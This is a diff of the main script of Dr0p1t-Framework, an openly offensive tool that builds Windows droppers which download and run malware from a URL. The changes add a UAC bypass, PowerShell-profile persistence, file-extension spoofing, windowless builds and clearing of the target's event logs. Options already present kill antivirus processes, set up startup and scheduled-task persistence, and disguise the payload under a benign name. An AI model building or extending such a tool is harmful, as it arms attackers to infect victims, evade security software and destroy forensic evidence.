@@ -2,6 +2,7 @@
 #Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
 from core.banners import random_banner as banner
 from core.color import *
+from core.Phishing import *
 from core import color,updater
 import argparse ,os ,textwrap ,sys ,subprocess, shutil ,random
 
@@ -12,10 +13,10 @@ formatter_class=argparse.RawDescriptionHelpFormatter,
 description=textwrap.dedent( warn() ),
 epilog="""\nExamples :
 ./Dr0p1t.py Malware_Url [Options]
-./Dr0p1t.py https://test.com/backdoor.exe -s -t -k --upx
+./Dr0p1t.py https://test.com/backdoor.exe -s -t -a -k --runas --upx
 ./Dr0p1t.py https://test.com/backdoor.exe -k -b block_online_scan.bat --only32
-./Dr0p1t.py https://test.com/backdoor.exe -s -t -k -p Enable_PSRemoting.ps1
-./Dr0p1t.py https://test.com/backdoor.exe -s -t -k --nouac -i flash.ico
+./Dr0p1t.py https://test.com/backdoor.exe -s -t -k -p Enable_PSRemoting.ps1 --runas
+./Dr0p1t.py https://test.com/backdoor.zip -t -k --nouac -i flash.ico --spoof pdf --zip
 
 Note : Scripts like (bat\\ps1\\vbs) can only loaded from the scripts folder.
         So if you wanna use custom scripts made by yourself,put it in the scripts folder.
@@ -24,16 +25,21 @@ Note : Scripts like (bat\\ps1\\vbs) can only loaded from the scripts folder.
 parser.add_argument("url", metavar='Malware_url',nargs="?", help="Url to your malware")
 parser.add_argument("-s", action='store_true', help="Add your malware to startup (Persistence)")
 parser.add_argument("-t", action='store_true', help="Add your malware to task scheduler (Persistence)")
+parser.add_argument("-a", action='store_true', help="Add your link to powershell user profile (Persistence)")
 parser.add_argument("-k", action='store_true', help="Kill antivirus process before running your malware.")
 parser.add_argument("-b", help="Run this batch script before running your malware. Check scripts folder")
 parser.add_argument("-p", help="Run this powershell script before running your malware. Check scripts folder")
 parser.add_argument("-v", help="Run this vbs script before running your malware. Check scripts folder")
-parser.add_argument("--only32",action='store_true', help="Download your malware for 32 bit devices only")
-parser.add_argument("--only64",action='store_true', help="Download your malware for 64 bit devices only")
+parser.add_argument("--runas",action='store_true', help="Bypass UAC and run your malware as admin")
+parser.add_argument("--spoof", help="Spoof the final file to an extension you choose.")
+parser.add_argument("--zip",action='store_true', help="Tell Dr0p1t that the malware in the link is compressed as zip")
 parser.add_argument("--upx",action='store_true', help="Use UPX to compress the final file.")
 parser.add_argument("--nouac",action='store_true', help="Try to disable UAC on victim device")
-parser.add_argument("--nocompile",action='store_true', help="Tell the framework to not compile the final file.")
 parser.add_argument("-i", help="Use icon to the final file. Check icons folder.")
+parser.add_argument("--noclearevent",action='store_true', help="Tell the framework to not clear the event logs on target machine after finish.")
+parser.add_argument("--nocompile",action='store_true', help="Tell the framework to not compile the final file.")
+parser.add_argument("--only32",action='store_true', help="Download your malware for 32 bit devices only")
+parser.add_argument("--only64",action='store_true', help="Download your malware for 64 bit devices only")
 parser.add_argument("-q", action='store_true', help="Stay quite ( no banner )")
 parser.add_argument("-u", action='store_true', help="Check for updates")
 parser.add_argument("-nd", action='store_true', help="Display less output information")
@@ -45,7 +51,7 @@ def PyInstaller():
     else:
         if sys.platform == "darwin": # On osx, the default .wine directory is located on $HOME/.wine/
             installer = "wine " + os.environ['HOME'] + "/.wine/drive_c/Python27/python.exe " + os.environ['HOME'] + "/.wine/drive_c/Python27/Scripts/pyinstaller-script.py"
-        else: # TODO: find all defaults location for .wine , or request it directely to the user if not found.
+        else: #ToDo: find all defaults location for .wine , or request it directely to the user if not found.
             installer = "wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py"
 
     p = subprocess.Popen( installer + " -h",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE )
@@ -57,7 +63,7 @@ def PyInstaller():
 
 def get_code(f):
     code = open( f,"r" ).read()
-    return code.split("#Start\n")[1]
+    return "\n"+code.split("#Start")[1]
 
 def make_copy( old,new ):
     old_file = open( old,"rb" )
@@ -68,7 +74,7 @@ def make_copy( old,new ):
     new_file.close()
 
 def random_name():
-    return "Your_daily_malware_" + str(random.randint(0,100))
+    return "Dr0pp1r" + str(random.randint(0,100))
 
 def clear():
     if os.name=="nt":
@@ -115,7 +121,7 @@ def main():
     url      = args.url
     p        = "resources"
     fullp    = os.getcwd()
-    command  = installer +" -F --noupx {} "
+    command  = installer +" --noconsole -F --noupx {} "
     bat_path = ["scripts","bat"]
     ps1_path = ["scripts","powershell"]
     vbs_path = ["scripts","vbs"]
@@ -124,7 +130,13 @@ def main():
     print_status(args)
     colored_print( " [*] Creating DR0P3R..","g" )
 
+    f += "#!/usr/bin/python\n"
+    f += "# -*- coding: iso-8859-15 -*-\n"
     f += 'import subprocess\n'
+
+    f += get_code( os.path.join(p,"pre_run.py") )+"\n"
+    #this functions for :
+    #get_output(cmd): to get output of command without using pipe to escape the fatal error after compiling !!
 
     if args.k:
         if not args.nd:
@@ -132,39 +144,63 @@ def main():
         f += get_code( os.path.join(p,"killav.py") )+"\n"
 
     if sys.version_info[0]==3:
-    	f += 'from urllib.request import urlretrieve\n'
+    	f += '\nfrom urllib.request import urlretrieve'
     elif sys.version_info[0]==2:
-    	f += 'from urllib import urlretrieve\n'
-
-    f += get_code( os.path.join(p,"dropper.py") )+"\n"
+    	f += '\nfrom urllib import urlretrieve'
 
     if "http" not in url:
         url = "http://"+url
 
     if args.only32:
-        f += 'fire_things_up("{}",arch="32")\n'.format( url )
+        if args.zip:
+            f += get_code( os.path.join(p,"dropper.py") ).replace("##~Import-Here~##","import zipfile").split("#Someshit")[0]+"\n"
+            f += '\nfire_things_up("{}","32",True)\n'.format( url )
+        else:
+            f += get_code( os.path.join(p,"dropper.py") ).split("#Someshit")[0]
+            f += '\nfire_things_up("{}","32")\n'.format( url )
+
     elif args.only64:
-        f += 'fire_things_up("{}",arch="64")\n'.format( url )
+        if args.zip:
+            f += get_code( os.path.join(p,"dropper.py") ).replace("##~Import-Here~##","import zipfile").split("#Someshit")[0]+"\n"
+            f += '\nfire_things_up("{}","64",True)\n'.format( url )
+        else:
+            f += get_code( os.path.join(p,"dropper.py") ).split("#Someshit")[0]
+            f += '\nfire_things_up("{}","64")\n'.format( url )
+
     elif not args.only32 or not args.only64:
-        f += 'fire_things_up("{}")\n'.format( url )
+        if args.zip:
+            f += get_code( os.path.join(p,"dropper.py") ).replace("##~Import-Here~##","import zipfile").split("#Someshit")[0]+"\n"
+            f += '\nfire_things_up("{}",False,True)\n'.format( url )
+        else:
+            f += get_code( os.path.join(p,"dropper.py") ).split("#Someshit")[0]
+            f += '\nfire_things_up("{}")\n'.format( url )
+
+    if args.runas:
+        f += get_code( os.path.join(p,"runas.py") )
+    else:
+        f += get_code( os.path.join(p,"dropper.py") ).split("#Someshit")[1]
 
     if args.s:
         if not args.nd:
             colored_print( " [*] Adding startup function..","g" )
-        if "from random import randint" not in f:
-            f+="from random import randint\n"
-        if "File = 'hosts.exe'" not in f:
-            f+="File = 'hosts.exe'\n"
+        if "File = 'library.exe'" not in f:
+            f+="\nFile = 'library.exe'"
         f += get_code( os.path.join(p,"add2startup.py") )+"\n"
 
     if args.t:
         if not args.nd:
             colored_print( " [*] Adding task function..","g" )
-        if "from random import randint" not in f:
-            f+="from random import randint\n"
-        if "File = 'hosts.exe'" not in f:
-            f+="File = 'hosts.exe'\n"
+        if "File = 'library.exe'" not in f:
+            f+="\nFile = 'library.exe'"
         f += get_code( os.path.join(p,"add2task.py") )+"\n"
+
+    if args.a:
+        if not args.nd:
+            colored_print( " [*] Adding add2profile function..","g" )
+        if "File = 'library.exe'" not in f:
+            f+="\nFile = 'library.exe'\n"
+        f += "\nlink='{}'".format(url)
+        f += get_code( os.path.join(p,"add2profile.py") )+"\n"
 
     if args.b:
         try :
@@ -172,7 +208,7 @@ def main():
                 colored_print( " [*] Adding runbat function..","g" )
             bat_path.append(args.b)
             ff = open( os.path.join(*bat_path ) ).read()
-            f += "Bat_Script_Data = '''{}'''\n".format( ff )
+            f += "\nBat_Script_Data = '''{}'''".format( ff )
             f += get_code( os.path.join(p,"Runbat.py") )+"\n"
         except:
             colored_print( " [!] Error in reading bat file,are you sure it's in scripts folder ?","r" )
@@ -183,7 +219,7 @@ def main():
                 colored_print( " [*] Adding runps1 function..","g" )
             ps1_path.append(args.p)
             ff = open( os.path.join(*ps1_path ) ).read()
-            f += "Ps1_Script_Data = '''{}'''\n".format( ff )
+            f += "\nPs1_Script_Data = '''{}'''".format( ff )
             f += get_code( os.path.join(p,"Runps1.py") )+"\n"
         except :
             colored_print( " [!] Error in reading ps1 file,are you sure it's in scripts folder ?","r" )
@@ -194,7 +230,7 @@ def main():
                 colored_print( " [*] Adding runvbs function..","g" )
             vbs_path.append(args.v)
             ff = open( os.path.join(*vbs_path ) ).read()
-            f += "Vbs_Script_Data = '''{}'''\n".format( ff )
+            f += "\nVbs_Script_Data = '''{}'''".format( ff )
             f += get_code( os.path.join(p,"Runvbs.py") )+"\n"
         except :
             colored_print( " [!] Error in reading vbs file,are you sure it's in scripts folder ?","r" )
@@ -206,8 +242,14 @@ def main():
 
     colored_print( " [*] Adding self destruct function..","g" )
     f += get_code( os.path.join(p,"SelfDestruct.py") )+"\n"
+
+    if not args.noclearevent:
+        colored_print( " [*] Adding clear eventlog function..","g" )
+        f += get_code( os.path.join(p,"Clearev.py") )+"\n"
+
     colored_print( " [*] Saving the final file..","g" )
     file_name = random_name()
+
     os.chdir("temp")
     fo = open( file_name+".py","w" )
     fo.write(f)
@@ -217,20 +259,22 @@ def main():
         if PyInstaller():
             colored_print( " [*] Compiling the final file to exe..","g" )
             if args.i:
-                try:
+                if os.path.isfile( os.path.join(fullp,"icons",args.i) ):
                     if not args.nd:
                         colored_print( " [*] Adding icon to the final file..","g" )
-                    ff = open( os.path.join(fullp,"icons",args.i) ).read()
                     command += "--icon=" + os.path.join(fullp,"icons",args.i)
-                except:
+                else:
                     colored_print( " [!] Error in icon file,are you sure it's in icons folder ?","r" )
 
-            try:
-                p  = subprocess.Popen( command.format(file_name+".py"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                (output, err) = p.communicate()
-                pw = p.wait()
-            except:
-                colored_print( " [!] Error in compiling file,are you sure pyinstaller is installed ?","r" )
+            p     = subprocess.Popen( command.format(file_name+".py"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            (output, err) = p.communicate()
+            debug = output.decode() + "\n" + err.decode()
+            pw    = p.wait()
+            if "Traceback" in debug:
+                f=open("debug.txt","w")
+                f.write(debug)
+                f.close()
+                colored_print( " [!] Error in compiling file [ See debug.txt file in temp folder ! ]","r" )
                 sys.exit(0)
 
             file_name = get_executable()
@@ -242,6 +286,15 @@ def main():
 
             os.chdir("..")
             make_copy( os.path.join("temp","dist",file_name),os.path.join("output",file_name) )
+
+            if args.spoof:
+                if not args.nd:
+                    colored_print( " [*] Spoofing the final file extension..","g" )
+                if Spoof_extension(os.path.join("output",file_name),args.spoof):
+                    colored_print( " [*] File extension spoof complate !","g" )
+                else:
+                    colored_print( " [!] File extension spoof failed !","r" )
+
         else:
             colored_print( " [!] PyInstaller not installed : Can't compile file to exe..","r" )
 
